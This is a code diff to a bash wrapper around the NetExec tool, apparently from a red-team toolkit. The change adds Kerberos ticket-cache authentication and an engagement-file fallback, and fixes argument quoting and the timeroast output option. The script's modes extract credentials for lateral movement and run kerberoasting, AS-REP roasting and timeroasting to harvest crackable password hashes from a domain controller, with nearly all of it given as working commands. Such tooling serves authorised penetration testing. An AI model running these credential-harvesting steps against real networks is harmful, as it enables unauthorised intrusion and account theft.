@@ -10,7 +10,7 @@ NC="${C}[0m"
 
 # ───────── Usage ──────────
 usage() {
-  echo -e "${YELLOW}Usage:${NC} $0 <mode> <target> -u <user> (-p <pass> | -H <hash> | --aesKey <key> --kdcHost <dc>) -o <output-dir> [--local-auth]"
+  echo -e "${YELLOW}Usage:${NC} $0 <mode> <target> -u <user> (-p <pass> | -H <hash> | --aesKey <key> --kdcHost <dc> | --use-kcache) -o <output-dir> [--local-auth]"
   echo ""
   echo "  <mode>        elevated | verify | roast"
   echo "                  elevated: Requires elevated privileges (local admin+) to extract credentials and interesting information for lateral movement"
@@ -20,8 +20,9 @@ usage() {
   echo "  -H            NTLM hash"
   echo "  --aesKey      Kerberos AES key (requires --kdcHost)"
   echo "  --kdcHost     Domain Controller to contact (used with --aesKey)"
+  echo "  --use-kcache  Use Kerberos ccache ticket (no user/pass/hash needed)"
   echo "  -o            Output directory (will be created if it doesn't exist)"
-  echo "  --local-auth  Specify if it's a local account (ignored with --aesKey)"
+  echo "  --local-auth  Specify if it's a local account (ignored with --aesKey/--use-kcache)"
   echo "  -h            Show this help"
   exit 1
 }
@@ -35,6 +36,7 @@ shift
 LOCAL_AUTH=0
 AESKEY=""
 KDCHOST=""
+USE_KCACHE=0
 
 # Pre-scan args for long options
 for arg in "$@"; do
@@ -42,6 +44,10 @@ for arg in "$@"; do
   --local-auth)
     LOCAL_AUTH=1
     set -- "${@/--local-auth/}"
+    ;;
+  --use-kcache)
+    USE_KCACHE=1
+    set -- "${@/--use-kcache/}"
     ;;
   --aesKey) AESKEY_SET=1 ;;
   --kdcHost) KDCHOST_SET=1 ;;
@@ -79,8 +85,26 @@ while [[ $# -gt 0 ]]; do
   esac
 done
 
+# ───────── Fallback: source engagement.env if OUTDIR not set ──────────
+if [[ -z "$OUTDIR" ]]; then
+  if [[ -n "$SUDO_USER" ]]; then
+    _home=$(getent passwd "$SUDO_USER" | cut -d: -f6)
+  else
+    _home="$HOME"
+  fi
+  _env="${_home}/.config/NotSliver/engagement.env"
+  if [[ -f "$_env" ]]; then
+    source "$_env"
+  fi
+fi
+
 # ───────── Validate Arguments ──────────
-if [[ -z "$MODE" || -z "$TARGET" || -z "$USER" || -z "$OUTDIR" ]]; then
+if [[ -z "$MODE" || -z "$TARGET" || -z "$OUTDIR" ]]; then
+  usage
+fi
+
+if [[ $USE_KCACHE -eq 0 && -z "$USER" ]]; then
+  echo -e "${RED}[-] Username (-u) is required unless using --use-kcache${NC}"
   usage
 fi
 
@@ -90,7 +114,12 @@ if [[ "$MODE" != "elevated" && "$MODE" != "verify" && "$MODE" != "roast" ]]; the
 fi
 
 # auth validation
-if [[ -n "$AESKEY" || -n "$KDCHOST" ]]; then
+if [[ $USE_KCACHE -eq 1 ]]; then
+  if [[ -n "$PASS" || -n "$HASH" || -n "$AESKEY" ]]; then
+    echo -e "${RED}[-] Cannot use --use-kcache with -p, -H, or --aesKey${NC}"
+    usage
+  fi
+elif [[ -n "$AESKEY" || -n "$KDCHOST" ]]; then
   if [[ -z "$AESKEY" || -z "$KDCHOST" ]]; then
     echo -e "${RED}[-] --aesKey requires --kdcHost and vice versa${NC}"
     usage
@@ -101,7 +130,7 @@ if [[ -n "$AESKEY" || -n "$KDCHOST" ]]; then
   fi
 else
   if [[ -z "$PASS" && -z "$HASH" ]]; then
-    echo -e "${RED}[-] Must specify either -p, -H, or --aesKey+--kdcHost${NC}"
+    echo -e "${RED}[-] Must specify either -p, -H, --aesKey+--kdcHost, or --use-kcache${NC}"
     usage
   elif [[ -n "$PASS" && -n "$HASH" ]]; then
     echo -e "${RED}[-] Specify only one of -p or -H${NC}"
@@ -110,7 +139,7 @@ else
 fi
 
 if [[ "$MODE" == "verify" ]]; then
-  LOGFILE="$OUTDIR"/"${USER}_${MODE}.log"
+  LOGFILE="$OUTDIR"/"${USER:-kcache}_${MODE}.log"
 else
   LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
 fi
@@ -136,31 +165,35 @@ log() {
 
 run_nxc() {
   log "Running: $*"
-  unbuffer $* | tee -a "$LOGFILE"
+  unbuffer "$@" | tee -a "$LOGFILE"
 }
 
 run_nxc_creds() {
   log "Running: $*" "$CREDFILE"
-  unbuffer $* | tee -a "$LOGFILE" | tee -a "$CREDFILE"
+  unbuffer "$@" | tee -a "$LOGFILE" | tee -a "$CREDFILE"
 }
 
 run_nxc_interesting() {
   log "Running: $*" "$INTERESTINGFILE"
-  unbuffer $* | tee -a "$LOGFILE" | tee -a "$INTERESTINGFILE"
+  unbuffer "$@" | tee -a "$LOGFILE" | tee -a "$INTERESTINGFILE"
 }
 
 # build base auth flags
-BASE_AUTH_ARGS="-u $USER"
-if [[ -n "$PASS" ]]; then
-  BASE_AUTH_ARGS+=" -p $PASS"
-elif [[ -n "$HASH" ]]; then
-  BASE_AUTH_ARGS+=" -H $HASH"
-elif [[ -n "$AESKEY" ]]; then
-  BASE_AUTH_ARGS+=" --aesKey $AESKEY --kdcHost $KDCHOST"
+if [[ $USE_KCACHE -eq 1 ]]; then
+  BASE_AUTH_ARGS="--use-kcache -k"
+else
+  BASE_AUTH_ARGS="-u $USER"
+  if [[ -n "$PASS" ]]; then
+    BASE_AUTH_ARGS+=" -p $PASS"
+  elif [[ -n "$HASH" ]]; then
+    BASE_AUTH_ARGS+=" -H $HASH"
+  elif [[ -n "$AESKEY" ]]; then
+    BASE_AUTH_ARGS+=" --aesKey $AESKEY --kdcHost $KDCHOST"
+  fi
 fi
 
 AUTH_ARGS="$BASE_AUTH_ARGS"
-if [[ $LOCAL_AUTH -eq 1 && -z "$AESKEY" ]]; then
+if [[ $LOCAL_AUTH -eq 1 && $USE_KCACHE -eq 0 && -z "$AESKEY" ]]; then
   AUTH_ARGS+=" --local-auth"
 fi
 
@@ -257,8 +290,9 @@ roast)
   log "Starting kerberoast & asreproast…"
   run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
   run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
-  run_nxc nxc smb "$TARGET" -M timeroast "$OUTDIR/timeroast.hash"
+  run_nxc nxc smb "$TARGET" -M timeroast -o OUTPUT="$OUTDIR/timeroast.hash"
   echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
   echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
+  echo -e "${GREEN}[✓] Timeroast hashes:     $OUTDIR/timeroast.hash"
   ;;
 esac
